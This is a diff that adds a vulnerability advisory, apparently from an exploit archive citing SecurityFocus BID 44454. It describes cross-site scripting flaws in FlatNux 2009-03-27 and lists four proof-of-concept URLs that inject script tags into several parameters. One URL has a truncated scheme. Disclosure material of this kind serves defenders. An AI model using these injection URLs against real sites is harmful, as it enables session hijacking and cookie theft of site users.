@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/44454/info
+
+FlatNux is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+FlatNux 2009-03-27 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/flatnux/index.php?mod="><script>alert(0)</script>
+http://www.example.com/flatnux/index.php?mod=login&op=profile&user="><script>alert(0)</script>
+http://www.example.com/flatnux/index.php?opindex=modcont&file=misc/motd.en.php&from="><script>alert(0)</script>
+ttp://www.example.com/flatnux/controlcenter.php?mod=controlcenter&op=03_users/20_groups&opmod=insnew_groups&pk="><script>alert(0)</script>
